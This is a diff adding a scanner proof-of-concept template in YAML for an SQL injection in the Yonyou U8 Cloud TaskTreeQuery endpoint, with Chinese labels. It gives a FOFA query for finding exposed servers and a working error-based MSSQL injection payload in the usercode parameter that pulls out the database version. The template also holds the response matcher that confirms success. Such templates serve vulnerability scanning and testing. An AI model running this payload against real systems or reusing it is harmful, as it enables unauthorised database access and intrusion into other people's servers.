@@ -1,0 +1,17 @@
+id: poc-yaml-yongyou-u8-cloud-tasktreequery-sqli
+info:
+  name: 用友-U8-Cloud /nc.itf.iufo.mobilereport.task.TaskTreeQuery SQL 注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 用友U8cloud
+  fofa: title=\"U8C\" && body=\"U8 cloud\"
+requests:
+- method: GET
+  path: /service/~iufo/nc.itf.iufo.mobilereport.task.TaskTreeQuery?usercode=1'%20and%201=convert(int,(select%20@@version))--
+  expression: "status_code == 200 && \ncontains(body,\"Microsoft SQL Server\") &&\n\
+    contains(body,\"nvarchar\") &&\ncontains(body,\"转换成数据类型\") &&\ncontains(body,\"\
+    失败\")\n"
+variables: {}
+transport: http
